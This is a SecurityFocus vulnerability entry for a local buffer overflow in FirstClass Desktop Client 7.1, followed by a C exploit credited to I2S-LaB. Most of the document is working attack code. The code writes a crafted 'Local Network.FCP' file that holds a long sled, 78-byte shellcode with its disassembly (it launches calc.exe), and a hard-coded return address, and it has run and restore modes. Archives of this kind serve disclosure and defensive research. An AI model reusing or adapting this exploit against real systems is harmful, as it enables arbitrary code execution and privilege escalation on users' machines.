source: http://www.securityfocus.com/bid/10074/info

It has been reported that FirstClass Desktop Client may be prone to a local buffer overflow vulnerability that could allow attackers to execute arbitrary code on a vulnerable system that may lead to elevated privileges. The issue is reported to exist due to the 'PROXYADDR' variable of the 'LOCAL NETWORK.FCP' configuration file.

This issue is reported to exist in Centrinity FirstClass Desktop Client 7.1. 

ss Desktop 7.1 (latest) buffer overflow exploit               #
####################################################
Discovered and coded by I2S-LaB.

URL     : http://www.I2S-LaB.com
contact : contact[at]I2S-LaB.com

++++++++++++++++++++++++++++++++++++++++++++++++++++
Compile it with cl.exe (VC++6)
***********************************************************/

#include <windows.h>

void main (int argc, char *argv[])
{

	HANDLE FCP;	
	DWORD NumberOfBytesWritten;
	unsigned char *p, 

		FC_FILE[] = "Local Network.FCP",
		PATH[]   = "C:\\Program Files\\FirstClass\\Fcp\\",
			
		rawData[] =

		/////////////////////////////////////////////////////////////////
		// FC file data
		/////////////////////////////////////////////////////////////////
		"\x43\x4F\x4E\x4E\x54\x59\x50\x45\x20\x3D\x20\x38\x0D\x0A\x46\x43" 
		"\x50\x45\x4E\x43\x52\x59\x50\x54\x20\x3D\x20\x31\x0D\x0A\x44\x4C"
		"\x53\x45\x4E\x44\x20\x3D\x20\x30\x0D\x0A\x44\x4C\x45\x52\x52\x53"
		"\x20\x3D\x20\x30\x0D\x0A\x44\x4C\x52\x43\x56\x20\x3D\x20\x30\x0D" 
		"\x0A\x4D\x44\x4D\x44\x42\x47\x20\x3D\x20\x30\x0D\x0A\x53\x4C\x44" 
		"\x42\x47\x20\x3D\x20\x30\x0D\x0A\x54\x43\x50\x54\x58\x57\x49\x4E" 
		"\x20\x3D\x20\x31\x30\x30\x30\x30\x0D\x0A\x54\x43\x50\x52\x58\x42" 
		"\x55\x46\x20\x3D\x20\x31\x30\x30\x30\x30\x0D\x0A\x54\x43\x50\x52" 
		"\x45\x4D\x50\x4F\x52\x54\x20\x3D\x20\x35\x31\x30\x0D\x0A\x50\x52" 
		"\x4F\x58\x59\x50\x4F\x52\x54\x20\x3D\x20\x22"
		
		/////////////////////////////////////////////////////////////////
		// MASS NOP LIKE : 'A' = inc ecx
		/////////////////////////////////////////////////////////////////
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		
	
		/*
		 * Fcclient Specific shellcode [78 bytes]
		 *****************************************************************
			:00401006 EB47                    jmp 0040104F
			:00401008 5A                      pop edx
			:00401009 33FF                    xor edi, edi
			:0040100B 8BEC                    mov ebp, esp
			:0040100D 57                      push edi
			:0040100E 52                      push edx
			:0040100F 57                      push edi
			:00401010 6845786563              push 63657845
			:00401015 4F                      dec edi
			:00401016 81EFFFA89691            sub edi, 9196A8FF
			:0040101C 57                      push edi
			:0040101D 68454C3332              push 32334C45
			:00401022 684B45524E              push 4E52454B
			:00401027 8D5DE4                  lea ebx, dword ptr [ebp-1C]
			:0040102A 53                      push ebx
			:0040102B 33FF                    xor edi, edi
			:0040102D 81EF589D9DFF            sub edi, FF9D9D58
			:00401033 FF17                    call dword ptr [edi]
			:00401035 8D5DED                  lea ebx, dword ptr [ebp-13]
			:00401038 53                      push ebx
			:00401039 50                      push eax
			:0040103A 6681F75103              xor di, 0351
			:0040103F 4F                      dec edi
			:00401040 FF17                    call dword ptr [edi]
			:00401042 6A01                    push 00000001
			:00401044 FF75F8                  push [ebp-08]
			:00401047 FFD0                    call eax
			:00401049 6683EF4C                sub di, 004C
			:0040104D FFD7                    call edi
			:0040104F E8B4FFFFFF              call 00401008
			**********************************************************
			*
		 */

		"\xEB\x47\x5A\x33\xFF\x8B\xEC\x57\x52\x57\x68\x45\x78\x65\x63\x4F"
		"\x81\xEF\xFF\xA8\x96\x91\x57\x68\x45\x4C\x33\x32\x68\x4B\x45\x52" 
		"\x4E\x8D\x5D\xE4\x53\x33\xFF\x81\xEF\x58\x9D\x9D\xFF\xFF\x17\x8D" 
		"\x5D\xED\x53\x50\x66\x81\xF7\x51\x03\x4F\xFF\x17\x6A\x01\xFF\x75" 
		"\xF8\xFF\xD0\x66\x83\xEF\x4C\xFF\xD7\xE8\xB4\xFF\xFF\xFF"
 
		"calc.exe & " // to execute

		////////////////////////////////////////////////////////////////
		// OTHER DATA
		////////////////////////////////////////////////////////////////
		"\x22\x0A\x0D\x0A\x50\x52\x4F\x58\x59\x41\x44\x44\x52\x20" 
		"\x3D\x20\x22\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x45\x45\x45" 
		"\x45\x44\x44"

		/////////////////////////////////////////////////////////////////
		// Return Address
		/////////////////////////////////////////////////////////////////
		"\x5f\x75\xC2\x00";

		// Banner
		printf ("###############################################\n"
			"FirstClass Client local buffer overflow Exploit\n"
			"###############################################\n"
			"Discovered & coded by I2S-LaB.\n\n"
			"URL  : http://www.I2S-LaB.com\n"
			"MAIL : Contact[at]I2S-LaB.com\n\n");


		if ( !argv[1]) argv[1] = FC_FILE;

		(argc > 2 ) ? (p = argv[2]) : (p = PATH);

		if ( !(SetCurrentDirectory( p ) ) )
		{
			printf ("cannot set current directory to %s\nexiting.\n", p);
			ExitProcess(0);
		}

		if (!lstrcmpi (argv[1], "/restore") )
	
			printf ("Restore the backup file...%s\n", 
		CopyFile ("Local Network.BAK", FC_FILE, FALSE) ? "ok" : "Error : backup file not found!\n");

		else if ( !lstrcmpi (argv[1], "/run"))
		{
			printf ("Saving the Local Network file...%s\n", 
			CopyFile (FC_FILE, "Local Network.BAK", TRUE) ? "ok" : "Backup file cannot be made");


			printf ("Opening the Local Network file...");
				FCP = CreateFile (FC_FILE, GENERIC_WRITE, 
						  FILE_SHARE_WRITE, NULL,
						  OPEN_EXISTING,
						  FILE_ATTRIBUTE_NORMAL,NULL);

			if (FCP == INVALID_HANDLE_VALUE)
			{
				printf ("cannot open Local Network file, exiting!\n");
				ExitProcess (-1);
			}

	printf ("ok\nWriting the Local Network File...%s\n",
	WriteFile (FCP, rawData, strlen (rawData) + 1, &NumberOfBytesWritten, NULL) ? "ok" : "Write file error!");
		}

	else printf ("usage : %s /RUN | /RESTORE [path to Local Network.FCP]\n\n"
	"/RUN     : launch the xploit against \"Local Network.FCP\"\n"
	"/RESTORE : Restore the previous \"Local Network.FCP\"\n\n"
	"[path to Local Network.FCP] : Optional,\ndefine the path of the \"Local Network.FCP\" to exploit.\n"
	"Default is %s\n", argv[0], PATH);
}